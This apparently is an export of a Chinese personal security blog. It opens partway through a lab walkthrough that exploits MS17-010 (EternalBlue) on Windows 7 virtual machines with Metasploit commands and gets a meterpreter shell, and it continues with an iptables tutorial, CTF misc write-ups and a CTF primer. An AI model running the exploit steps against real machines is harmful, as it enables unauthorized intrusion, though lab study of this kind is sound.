class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 运行msfconsole工具</span>msfconsole<span class="hljs-comment"># 搜索ms17-010相关模块，并采用辅助模块进行测试</span>search ms17-010<span class="hljs-comment"># 发现有一个ms17_010的扫描检测模块可用, use</span>use auxiliary/scanner/smb/smb_ms17_010</code></pre></div><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109164105.png" srcset="/img/loading.gif"></p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 设置RHOSTS项为192.168.188.136</span><span class="hljs-built_in">set</span> RHOSTS 192.168.188.136<span class="hljs-comment"># 运行该ms17_010检测模块</span>run</code></pre></div><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109164829.png" srcset="/img/loading.gif"></p><p><strong>发现确实目标机器存在MS17-010，并提示可用之前git clone的DoublePulsar模块进行侵入</strong></p><h4 id="2-1-3-开始渗透"><a href="#2-1-3-开始渗透" class="headerlink" title="2.1.3 开始渗透"></a>2.1.3 开始渗透</h4><ul><li><strong>尝试攻击</strong></li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 使用doublepulsar攻击模块</span>use exploit/windows/smb/eternalblue_doublepulsar<span class="hljs-comment"># 设置RHOST项为192.168.188.136</span><span class="hljs-built_in">set</span> RHOST 192.168.188.136<span class="hljs-comment"># 查看攻击模块的配置，请特别注意DOUBLEPULSARPATH是否与你git clone下载的路径一致</span>show options</code></pre></div><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109170635.png" srcset="/img/loading.gif"></p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 运行攻击模块</span>run</code></pre></div><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109171143.png" srcset="/img/loading.gif"></p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 渗透并没有成功，修改PROCESSINJECT项为explorer.exe (修改为lsass.exe也可以)</span><span class="hljs-built_in">set</span> PROCESSINJECT explorer.exe<span class="hljs-comment"># 再次exploit，成功</span>run</code></pre></div><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109171502.png" srcset="/img/loading.gif"></p><p><strong>meterpreter</strong>是一个为攻击者提供交互性shell以便于在目标机器上执行代码的命令行工具。渗透成功的后续攻击可以参考阅读<a href="https://qgrain.github.io/2019/11/14/%E6%B8%97%E9%80%8F-%E9%80%9A%E8%BF%87meterpreter%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83/">【渗透】meterpreter提权</a></p><h3 id="2-2-渗透Windows7-64-bit"><a href="#2-2-渗透Windows7-64-bit" class="headerlink" title="2.2 渗透Windows7 64-bit"></a>2.2 渗透Windows7 64-bit</h3><p>相比于渗透Windows7 32-bit，渗透64位机器要简单得多，因为64位机器的渗透是msf内建支持的。</p><p><em><strong>前几个步骤基本和渗透32位机器一致</strong></em></p><h4 id="2-2-1-信息搜集"><a href="#2-2-1-信息搜集" class="headerlink" title="2.2.1 信息搜集"></a>2.2.1 信息搜集</h4><ul><li><strong>nmap扫描主机信息</strong></li><li><strong>msfconsole采用scanner模块扫描检测ms17-010漏洞</strong></li></ul><div class="hljs"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_ms17_010<span class="hljs-built_in">set</span> RHOSTS 192.168.188.138 <span class="hljs-comment"># Windows 7 x64</span>show optionsrun</code></pre></div><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191114113425.png" srcset="/img/loading.gif"></p><h4 id="2-2-2开始渗透"><a href="#2-2-2开始渗透" class="headerlink" title="2.2.2开始渗透"></a>2.2.2开始渗透</h4><ul><li><strong>方法一：采用msf自带的eternalblue攻击模块</strong></li></ul><div class="hljs"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue<span class="hljs-built_in">set</span> RHOST 192.168.188 138 <span class="hljs-comment"># Windows 7 x64</span>show optionsrun</code></pre></div><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191114114152.png" srcset="/img/loading.gif"></p><p>成功拿到目标机器的Shell</p><ul><li><strong>方法二：采用github开源攻击模块DoublePulsar</strong></li></ul><p>步骤和攻击32位机器一致，但是需要配置<a href>wine64和wine32共存</a></p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>Bug</tag>
      
      <tag>Penetration</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Iptables(1)</title>
    <link href="/2019/10/22/Iptables-1/"/>
    <url>/2019/10/22/Iptables-1/</url>
    
    <content type="html"><![CDATA[<h2 id="1-概念"><a href="#1-概念" class="headerlink" title="1 概念"></a>1 概念</h2><h3 id="1-1-防火墙的概念"><a href="#1-1-防火墙的概念" class="headerlink" title="1.1 防火墙的概念"></a>1.1 防火墙的概念</h3><ul><li>逻辑上讲，防火墙可以分为主机防火墙和网络防火墙<ol><li>主机防火墙：保护单个主机</li><li>网络防火墙：往往处于网络入口，保护入口后面的本地局域网</li></ol></li><li>物理上讲，防火墙可以分为硬件防火墙和软件防火墙<ol><li>硬件防火墙：在硬件级别实现防护</li><li>软件防火墙：通过软件在硬件平台上实现防护</li></ol></li></ul><h3 id="1-2-iptables的概念"><a href="#1-2-iptables的概念" class="headerlink" title="1.2 iptables的概念"></a>1.2 iptables的概念</h3><p>iptables是一个linux操作系统中的命令行工具。用户通过iptables能够实施对真正防火墙netfilter的操作，如<strong>网络地址转换，数据包内容修改，数据包过滤</strong>等</p><a id="more"></a><h3 id="1-3-链和表的概念"><a href="#1-3-链和表的概念" class="headerlink" title="1.3 链和表的概念"></a>1.3 链和表的概念</h3><h4 id="1-3-1-链"><a href="#1-3-1-链" class="headerlink" title="1.3.1 链"></a>1.3.1 链</h4><p>iptables 防火墙一共有五道关卡，五道关卡分别是<code>PREROUTING</code>，<code>INPUT</code>，<code>FORWARD</code>，<code>OUTPUT</code>，<code>POSTROUTING</code></p><p>根据实际情况的不同，报文会经过不同的关卡，如下图所示：<br><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191022194236.png" srcset="/img/loading.gif"></p><p>防火墙的作用就在于对经过的报文匹配“规则”，然后执行相应的动作。所以当报文流经关卡时，会匹配关卡上的规则。然而在每一道关卡上，规则可能不止一条，于是多条规则按照一定的逻辑顺序串成了一条<strong>链</strong>。如下图所示：<br><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191022194443.png" srcset="/img/loading.gif"></p><h4 id="1-3-2-表"><a href="#1-3-2-表" class="headerlink" title="1.3.2 表"></a>1.3.2 表</h4><p>我们把具有相同功能的规则的集合叫做<strong>“表”</strong>，iptables定义了四种表 **(优先级由高到低)**：</p><ul><li><p><strong>raw表</strong>：关闭nat表上启用的链接追踪机制；内核模块：iptables_raw</p></li><li><p><strong>mangle表</strong>：拆解，修改，重新封装报文；内核模块：iptables_mangle</p></li><li><p><strong>nat表</strong>：网络地址转换（network address translation）；内核模块：iptables_nat</p></li><li><p><strong>filter表</strong>：负责过滤功能；内核模块：iptables_filter</p></li></ul><h4 id="1-3-3-表与链的关系"><a href="#1-3-3-表与链的关系" class="headerlink" title="1.3.3 表与链的关系"></a>1.3.3 表与链的关系</h4><p>不同的链上的规则会根据功能不同而存放在不同的表中，不同的链上能存放的表也有所不同。以下是链与表的关系：</p><ul><li><strong>PREROUTING</strong>：raw表，mangle表，nat表</li><li><strong>INPUT</strong>：mangle表，filter表</li><li><strong>FORWARD</strong>：mangle表，filter表</li><li><strong>OUTPUT</strong>：raw表，mangle表，nat表，filter表</li><li><strong>POSTROUTING</strong>：mangle表，nat表</li></ul><p><strong>但是，我们在实际操作iptables的时候，往往是通过“表”作为操作入口，对规则进行定义的。</strong>以下是表与链的关系：</p><ul><li><strong>raw</strong>：PREROUTING，OUTPUT</li><li><strong>mangle</strong>：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING</li><li><strong>nat</strong>：PREROUTING，OUTPUT，POSTROUTING</li><li><strong>filter</strong>：INPUT，FORWARD，OUTPUT</li></ul><p><strong>数据包流经主机的详细图解</strong></p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191022194815.png" srcset="/img/loading.gif"></p><h2 id="2-iptables的规则管理"><a href="#2-iptables的规则管理" class="headerlink" title="2 iptables的规则管理"></a>2 iptables的规则管理</h2><h3 id="2-1-基本的规则操作"><a href="#2-1-基本的规则操作" class="headerlink" title="2.1 基本的规则操作"></a>2.1 基本的规则操作</h3><ul><li><p><strong>查看规则</strong>：</p><ul><li>-L：list，显示指定的参数，在后面跟上链的名字可以指定查看的规则链</li><li>-C：check，查找并显示指定的参数</li><li>-t：table，指定要匹配的表，（当没有指定时，默认为filter表）</li><li>-v：verbose，详细信息（多出pkts，bytes，target，prot，opt，in，out等信息）</li><li>-n：不对ip进行域名反解</li><li>–line-number：显示规则的序号</li><li>-x：显示精确的packets和bytes数目</li></ul><p><strong>最终命令为<code>iptables</code>与上述<code>option</code>的组合</strong></p></li><li><p><strong>增加规则</strong>：</p><ul><li><code>-t</code> + <code>指定的表</code> 指定要操作的表</li><li><code>-I</code> + <code>指定的规则链</code>  insert，插入指定的表的规则链首</li><li><code>-A</code> + <code>指定的规则链</code>  append，追加到指定的表的规则链尾</li><li><code>-s</code>：源地址（default 为 0.0.0.0&#x2F;0，也即all）</li><li><code>-d</code>：目的地址（default 为0.0.0.0&#x2F;0，也即all）</li><li><code>-j</code>：taget字段，即ACCEPT、REJECT、DROP等动作</li></ul></li><li><p><strong>删除规则</strong>：</p><ul><li>根据规则的编号删除：<code>iptables -t TABLE -D CHAIN seq</code> 其中TABLE是指定的表，CHAIN是指定的链，seq是要删除的规则的序号。</li><li>根据具体的匹配条件与动作删除规则：如 <code>iptables -D INPUT -s 192.168.1.123 -j ACCEPT</code></li><li>删除某表的某条链中的所有规则：<code>iptables -t 表名 -F 链名</code>，<strong>F</strong> for flush（<strong>慎重！</strong>）</li><li>修改规则：<code>-R 链名 序号 新的匹配条件</code>，但更建议删除原规则再新建一条规则。</li></ul></li><li><p><strong>保存规则</strong>：</p><ul><li>centos中，使用service iptables save 即可。规则会默认保存在 &#x2F;etc&#x2F;sysconfig&#x2F;iptables文件中</li><li>通用方法：将iptables-save 的流重定向到&#x2F;etc&#x2F;sysconfig&#x2F;iptables 文件</li><li>重载规则：iptables-restore &lt; &#x2F;etc&#x2F;sysconfig&#x2F;iptables (重载会覆盖现有的规则)</li></ul></li></ul><h3 id="2-2-进阶规则操作—黑白名单"><a href="#2-2-进阶规则操作—黑白名单" class="headerlink" title="2.2 进阶规则操作—黑白名单"></a>2.2 进阶规则操作—黑白名单</h3><h4 id="2-2-1-黑名单"><a href="#2-2-1-黑名单" class="headerlink" title="2.2.1 黑名单"></a>2.2.1 黑名单</h4><ul><li><p><strong>概念</strong>：除了与名单上匹配的报文禁止通过以外，所有报文皆放行</p></li><li><p><strong>实现方法</strong>：<br>我们可以注意到iptables的每一条规则链后面都显示这样的内容：<br><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191022195523.png" srcset="/img/loading.gif"></p><p><code>policy 策略</code> 表示该链对于报文的<strong>默认策略</strong>。所以当默认策略为<strong>ACCEPT</strong>时，链中的规则应该为<strong>REJECT或DROP</strong>，此时之只有匹配到的报文会被拒绝或丢掉，其余的报文皆被放行，从而实现黑名单。</p></li><li><p><strong>命令</strong>：<code>iptables -P 链名 ACCEPT</code></p></li></ul><h4 id="2-2-2-白名单"><a href="#2-2-2-白名单" class="headerlink" title="2.2.2 白名单"></a>2.2.2 白名单</h4><ul><li><strong>概念</strong>：除了与名单上匹配的报文会放行，所有报文皆被禁止通过</li><li><strong>实现方法</strong>：将默认策略设置为<strong>REJECT或DROP</strong>，链中的规则设置为<strong>ACCEPT</strong></li><li><strong>命令</strong>：<code>iptables -P 链名 REJECT or iptables -P 链名 DROP</code></li></ul><h4 id="2-2-3-白名单的改进"><a href="#2-2-3-白名单的改进" class="headerlink" title="2.2.3 白名单的改进"></a>2.2.3 白名单的改进</h4><ul><li><p><strong>普通白名单的安全隐患</strong>：当我们将默认策略设置为拒绝时，如果我们 <code>iptables -F</code> 清空了规则链，那么所有报文都会被拒绝，如果管理员正在远程ssh操作，此时ssh连接则会直接断开，且目标机器会与外部通信阻隔</p></li><li><p><strong>改进</strong>：将默认策略的拒绝改为接受，然后将<strong>“拒绝所有的报文“</strong>放在规则链的末尾。根据规则链的顺序匹配可知，符合匹配规则的报文放行，否则一律禁止通过</p></li><li><p><strong>命令</strong>：</p><div class="hljs"><pre><code class="hljs undefined">iptables -P 链名 ACCEPT     <span class="hljs-comment">#更改默认策略</span>iptabels -A 链名 -<span class="hljs-keyword">j </span>REJECT  <span class="hljs-comment">#在链尾追加全部拒绝的规则</span></code></pre></div></li></ul><p><strong>参考文档：</strong><a href="https://www.zsythink.net/archives/tag/iptables/" target="_blank" rel="noopener">iptables防火墙|朱双印博客</a></p>]]></content>
    
    
    <categories>
      
      <category>Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>iptables</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【CTF例题分析】MISC杂项(一)</title>
    <link href="/2019/10/15/CTF%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90-MISC%E6%9D%82%E9%A1%B9-%E4%B8%80/"/>
    <url>/2019/10/15/CTF%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90-MISC%E6%9D%82%E9%A1%B9-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<p>CTF例题分析系列，MISC杂项方向(一)。本篇文章主要讲解三道从易到难的MISC方向的题目。目的在于让大家能够了解CTF的MISC类型的冰山一角。QAQ</p><h1 id="1-一道练手的题目"><a href="#1-一道练手的题目" class="headerlink" title="1 一道练手的题目 "></a>1 一道练手的题目 <img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/star_icon.png" width="30"></h1><blockquote><p>今天是菜小狗的生日，他收到了一个Linux系统光盘。</p><ul><li>要求拿到flag，提交格式为<code>flag{The_String_of_Flag}</code></li><li><a href="https://adworld.xctf.org.cn/media/task/attachments/630a886233764ec2a63f305f318c8baa" target="_blank" rel="noopener">附件下载地址</a></li></ul></blockquote><a id="more"></a><p>下载附件，发现该文件名很长，首先怀疑是否flag藏在文件名里<em><strong>（后觉此想法极其稚嫩）</strong></em></p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015171511.png" srcset="/img/loading.gif"></p><p><strong>发现无法解码，便老老实实按照题目所期望的方向解题</strong></p><ol><li>查看文件类型，发现是一个<code>Linux rev 1.0 ext3 filesystem data</code> 类型的文件。</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015164116.png" srcset="/img/loading.gif"></p><ol start="2"><li>（WSL无法正常使用mount）尝试挂载该文件系统，但是得到<code>is not a block device</code> 错误提示</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015172410.png" srcset="/img/loading.gif"></p><ol start="3"><li>使用<code>mount -o loop</code>  挂在环回文件系统到<code>./mnt/</code> 目录<img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015172741.png" srcset="/img/loading.gif"></li><li>查找flag相关的文件，可以看到有一个名为<code>flag.txt</code> 的文件，查看其内容。</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015184534.png" srcset="/img/loading.gif"></p><ol start="5"><li>字符串各个字符均为ASCII码可打印字符，且字符串以 <code>=</code> 结尾，怀疑是Base64编码，于是解码得到最终flag</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015184920.png" srcset="/img/loading.gif"></p><p><strong>注：关于上面提到Base64编码的猜测，可以参考我这一篇笔记 <a href="%5Bhttps://qgrain.github.io/2019/10/15/Base%E7%BC%96%E7%A0%81/%5D(https://qgrain.github.io/2019/10/15/Base%E7%BC%96%E7%A0%81/)">Base编码家族</a></strong></p><h1 id="2-一道有点难度的题目"><a href="#2-一道有点难度的题目" class="headerlink" title="2 一道有点难度的题目 "></a>2 一道有点难度的题目 <img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/star_icon.png" width="30"><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/star_icon.png" width="30"></h1><blockquote><p>今天菜小狗为了打败菜小猫，学了一套如来十三掌</p><ul><li>要求拿到flag，提交格式为&#96;flag{The_String_of_Flag}</li><li><a href="https://adworld.xctf.org.cn/media/task/attachments/26b2be68dfb841b9914e97315505effb.docx" target="_blank" rel="noopener">附件下载链接</a></li></ul></blockquote><p>下载附件发现是一个docx文档，其中有一段佛语…</p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015225149.png" srcset="/img/loading.gif"></p><ol><li>对于<strong>与佛论禅系列</strong>的加解密，我暂时没有深入了解，且先使用<a href="http://weibo.com/selphy/" target="_blank" rel="noopener">蓝色的风之精灵</a>制作的<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅加解密在线工具</a>将该密文解密</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015225556.png" srcset="/img/loading.gif"></p><p>得到依旧是加过密的字符串<code>MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code></p><ol start="2"><li>由于每一个字符均为base64字符集的可打印字符，所以猜测是否是经过Base64加过密的。然而使用Base家族解密工具根本无法成功解密。说明应该由另一种加密算法加过密的。<strong>由于加密串仍然为ASCII可编码打印的常规字符，遂尝试rot-13加解密算法</strong></li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015225918.png" srcset="/img/loading.gif"></p><ol start="3"><li>编写脚本，解密该字符串，注意rot-13加密算法无论加还是减结果都一样。</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015230007.png" srcset="/img/loading.gif"></p><ol start="4"><li>最后送给Base64解码，得到flag</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015230129.png" srcset="/img/loading.gif"></p><h1 id="3-一道有点复杂的题目"><a href="#3-一道有点复杂的题目" class="headerlink" title="3 一道有点复杂的题目"></a>3 一道有点复杂的题目<img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/star_icon.png" width="30"><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/star_icon.png" width="30"><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/star_icon.png" width="30"></h1><p>题目附件: <a href="http://ctf5.shiyanbar.com/stega/hell/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E5%9C%B0%E7%8B%B1.zip" target="_blank" rel="noopener">链接</a></p><blockquote><p>这是一道特别绕的题目</p></blockquote><ol><li>解压附件，得到 <strong>欢迎来到地狱</strong> 的文件夹</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015191108.png" srcset="/img/loading.gif"></p><ol start="2"><li>首先打开<strong>地狱伊始.jpg</strong>，发现图片格式不正确</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015191232.png" srcset="/img/loading.gif"></p><ol start="3"><li>用winhex打开该图片的字节码，发现文件头部有缺失，缺少文件的前4个字节信息</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015192538.png" srcset="/img/loading.gif"></p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015192222.png" srcset="/img/loading.gif"></p><p>在文件头部添加4个字节的内容 <code>FFD8 FFE0</code>, 图片修复成功，得到以下内容：</p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015192044.png" srcset="/img/loading.gif"></p><ol start="4"><li>下载网盘资源文件：<code>地狱之声.wav</code></li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015192859.png" srcset="/img/loading.gif"></p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015194913.png" srcset="/img/loading.gif"></p><ol start="5"><li>根据波形图的变化，猜测是摩尔斯电码<code>-.- . -.-- .-.. . - ..- ... --. --- </code></li></ol><p>译码得到<code>keyletusgo</code></p><ol start="6"><li>打开<strong>第二层地狱.docx</strong>，有一张图片和一些文字，但是看不出来有什么有价值的信息。于是打开word设置中的显示隐藏文字，得到提示<strong>“图片采用了隐写技术”</strong></li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015210549.png" srcset="/img/loading.gif"></p><p><img src="C:\Users\zhiyu\AppData\Roaming\Typora\typora-user-images\1571144719692.png" srcset="/img/loading.gif" alt="1571144719692"></p><ol start="7"><li>使用隐写术加解密在线工具aTool，得到压缩文件的解压密码</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015212504.png" srcset="/img/loading.gif"></p><ol start="8"><li>压缩文件夹打开后得到一张图片和一个文本文档，文本文档中的bit序列直接ASCII编码得到字符串**”ruokouling”**</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015213006.png" srcset="/img/loading.gif"><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015212829.png" srcset="/img/loading.gif"></p><p><strong>迷惑！此题的后续文件似乎丢失了，所以这一题的分析就到这里。</strong></p><p><strong>这一道题并不是很官方，但也能以此看出CTF的题目有时需要很大的脑回路。</strong></p><p><em><strong>望诸君共勉</strong></em></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF入门</title>
    <link href="/2019/10/14/CTF%E5%85%A5%E9%97%A8/"/>
    <url>/2019/10/14/CTF%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="1-CTF简介"><a href="#1-CTF简介" class="headerlink" title="1 CTF简介"></a>1 CTF简介</h2><p>CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯” 。</p><a id="more"></a><h2 id="2-CTF比赛模式"><a href="#2-CTF比赛模式" class="headerlink" title="2 CTF比赛模式"></a>2 CTF比赛模式</h2><h3 id="2-1-解题模式-Jeopardy"><a href="#2-1-解题模式-Jeopardy" class="headerlink" title="2.1 解题模式(Jeopardy)"></a>2.1 解题模式(Jeopardy)</h3><p>在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。</p><p>不同的是这个解题模式一般会设置 <strong>一血</strong> 、 <strong>二血</strong> 、 <strong>三血</strong> ，也即最先完成的前三支队伍会获得额外分值，所以这不仅是对首先解出题目的队伍的分值鼓励，也是一种团队能力的间接体现。</p><p>当然还有一种流行的计分规则是设置每道题目的初始分数后，根据该题的成功解答队伍数，来逐渐降低该题的分值，也就是说如果解答这道题的人数越多，那么这道题的分值就越低。最后会下降到一个保底分值后便不再下降。</p><p>题目类型主要包含 <strong>Web 网络攻防</strong> 、 <strong>RE 逆向工程</strong> 、 <strong>Pwn 二进制漏洞利用</strong> 、 <strong>Crypto 密码攻击</strong> 、 <strong>Mobile 移动安全</strong> 以及 <strong>Misc 安全杂项</strong> 这六个类别。</p><p>举例，比如 </p><h3 id="2-2-攻防模式-Attack-and-Defense"><a href="#2-2-攻防模式-Attack-and-Defense" class="headerlink" title="2.2 攻防模式(Attack and Defense)"></a>2.2 攻防模式(Attack and Defense)</h3><h4 id="2-2-1-概述"><a href="#2-2-1-概述" class="headerlink" title="2.2.1 概述"></a>2.2.1 概述</h4><p>攻防模式常见于线下决赛。在攻防模式中，初始时刻，所有参赛队伍拥有相同的系统环境（包含若干服务，可能位于不同的机器上），常称gamebox，参赛队伍挖掘网络服务漏洞并攻击对手服务获取 flag 来得分，修补自身服务漏洞进行防御从而防止扣分（一般来说防御只能避免丢分，当然有的比赛在防御上可以得分）</p><p>攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有<strong>很强观赏性</strong>和<strong>高度透明性</strong>的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。</p><p>一般比赛的具体环境会在<strong>开赛前一天或者当天开赛前半小时</strong>由比赛主办方给出（是一份几页的小文档）。在这一段时间内，你需要根据主办方提供的文档<strong>熟悉环境并做好防御</strong>。</p><p>在比赛开始前半小时，这半小时内是无法进行攻击的，各支队伍都会加紧熟悉比赛网络环境，并做好防御准备。至于敌方 Gamebox 的 IP 地址，则需要靠你自己在给出网段中发现。</p><p>如果是分为上午下午两场攻防赛的话，那么上午和下午的 Gamebox 漏洞服务会更换（避免比赛中途休息时选手交流），但管理时要用的 IP 地址等信息不会改变。也就是 <strong>下午会换新题</strong> 。</p><p>一般情况下，主办方会提供网线，<strong>但并不会提供网线转接口，所以需要自备。</strong></p><h4 id="2-2-2-基本规则"><a href="#2-2-2-基本规则" class="headerlink" title="2.2.2 基本规则"></a>2.2.2 基本规则</h4><p>攻防模式一般的规则如下</p><ul><li>战队初始分数均为 x 分</li><li>比赛以 5&#x2F;10 分钟为一个回合，每回合主办方会更新已放出服务的 Flag</li><li>每回合内，一个战队的一个服务被渗透攻击成功（被拿 Flag 并提交），则扣除一定分数，攻击成功的战队平分这些分数。</li><li>每回合内，如果战队能够维护自己的服务正常运行，则分数不会减少（如果防御成功加分则会加分）；</li><li>如果一个服务宕机或异常无法通过测试，则可能会扣分，服务正常的战队平分这些分。往往服务异常会扣除较多的分数。</li><li>如果该回合内所有战队的服务都异常，则认为是不可抗拒因素造成，分数都不减少。</li><li>每回合内，服务异常和被拿 Flag 可以同时发生，即战队在一个回合内单个服务可能会扣除两者叠加的分数。</li><li>禁止队伍使用通用防御方法</li><li>请参赛队伍在比赛开始时对所有服务进行备份，若因自身原因导致服务永久损坏或丢失，无法恢复，主办方不提供重置服务</li><li>禁止对赛题以外的比赛平台发起攻击，包括但不限于在 gamebox 提权 root、利用主办方平台漏洞等，违规者立刻被取消参赛资格</li><li>参赛队伍如果发现其他队伍存在违规行为，请立刻举报，主办方会严格审核并作出相应判罚。</li></ul><h4 id="2-2-3-网络环境"><a href="#2-2-3-网络环境" class="headerlink" title="2.2.3 网络环境"></a>2.2.3 网络环境</h4><p>文档上一般都会有比赛环境的 <strong>网络拓扑图</strong> （如下图），每支队伍会维护若干的 <strong>Gamebox（己方服务器）</strong> ，Gamebox 上部署有存在漏洞的服务。</p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191014164950.png" srcset="/img/loading.gif"></p><p>文档上会包括选手，攻防环境，主办方三者的环境。</p><p>选手需要在个人电脑上配置或者 DHCP 自动获取</p><ul><li>IP 地址</li><li>网关</li><li>掩码 DNS 服务器地址</li></ul><p>攻防环境</p><ul><li>Gamebox 所处地址，包括己方和其他队伍的地址。</li><li>比赛一般会提供队伍的 id 与对应 ip 的映射表，以便于让选手指定恰当的攻防策略。</li></ul><p>主办方环境</p><ul><li>比赛答题平台</li><li>提交 flag 接口</li><li>流量访问接口</li></ul><h4 id="2-2-4-访问-Gamebox"><a href="#2-2-4-访问-Gamebox" class="headerlink" title="2.2.4 访问 Gamebox"></a>2.2.4 访问 Gamebox</h4><p>参赛文档中会给出队伍登录 gamebox 的方式，一般来说如下</p><ul><li>用户名为 ctf</li><li>一般会通过 ssh 登录，登录方式为密码或者私钥。</li></ul><p>自然，在登录上战队机器后<strong>应该修改所有的默认密码</strong>，同时不应该设置弱密码。</p><h4 id="2-2-5-比赛的一些策略"><a href="#2-2-5-比赛的一些策略" class="headerlink" title="2.2.5 比赛的一些策略"></a>2.2.5 比赛的一些策略</h4><ol><li>在比赛过程中，不宜死耗在一道题上，由于一血的优势性，在比赛过程中更应该全面了解赛题难度，先从 <strong>简单题</strong> 开始进行分析，步步为营。</li><li>比赛过程中，两极会严重分化。应该着力打击和自己实力相当和比自己队伍更强的队伍，尤其是分数相差无几的情况下，更要严防严守。</li><li>比赛中 NPC 会不定时发出攻击流量。从攻击流量中可以得到 payload。</li><li>一定要把 NPC 往死里打。</li><li>在开赛初可以将所有的管理密码都设置为同一个密码，这样方便队员登录管理。在初期将所有文件备份下来供队内分享。</li></ol><h3 id="2-3-混合模式-Mix"><a href="#2-3-混合模式-Mix" class="headerlink" title="2.3 混合模式(Mix)"></a>2.3 混合模式(Mix)</h3><p>结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。</p><h3 id="2-4-战争分享模式-Belluminar"><a href="#2-4-战争分享模式-Belluminar" class="headerlink" title="2.4 战争分享模式(Belluminar)"></a>2.4 战争分享模式(Belluminar)</h3><h4 id="2-4-1-赛制介绍"><a href="#2-4-1-赛制介绍" class="headerlink" title="2.4.1 赛制介绍"></a>2.4.1 赛制介绍</h4><p>如官网介绍这样，BELLUMINAR CTF 赛制由受邀参赛队伍相互出题挑战，并在比赛结束后分享赛题的出题思路，学习过程以及解题思路等。战队评分依据出题得分，解题得分和分享得分，进行综合评价并得出最终的排名。</p><h4 id="2-4-2-出题阶段"><a href="#2-4-2-出题阶段" class="headerlink" title="2.4.2 